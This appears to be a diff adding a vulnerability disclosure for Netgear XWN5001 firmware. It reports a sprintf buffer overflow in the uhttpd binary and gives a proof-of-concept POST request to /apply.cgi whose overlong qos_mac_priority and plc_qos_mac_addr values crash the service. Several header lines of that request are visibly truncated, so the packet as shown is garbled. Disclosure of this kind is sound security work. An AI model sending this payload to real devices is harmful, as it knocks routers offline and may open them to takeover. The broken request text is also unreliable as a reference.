@@ -1,0 +1,23 @@
+# xwn5001-0.4.1.1
+## Firmware version
+xwn5001-0.4.1.1
+
+The firmware can be downloaded at https://www.netgear.com/support/product/xwn5001/.
+## description
+The Netgear xwn5001-0.4.1.1 uhttpd binary has a buffer overflow vulnerability. When a specific network packet is sent to the uhttpd binary, the sprintf operation crashes. This vulnerability can be exploited by a local or remote unauthenticated attacker.
+## detail
+The vulnerability is located in the function at address 0x43138C of the binary usr/sbin/uhttpd. The parameter qos_mac_priority and plc_qos_mac_addr passed to sprintf is the source of the issue.
+
+![plc_qos_mac_add](plc_qos_mac_add.png)
+
+## Send package
+```txt
+POST /apply.cgi? tim
+Host: /cgi-bin/
+C
+Accept:
+Con
+Content-Length: 717
+
+qos_mac_priority=111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111&plc_qos_mac_addr=11111111111111111111111111111111111111111111111111111111111111111111111111111111111&%20timestamp=;wzq&submit_flag=plc_qos_mac_add
+```
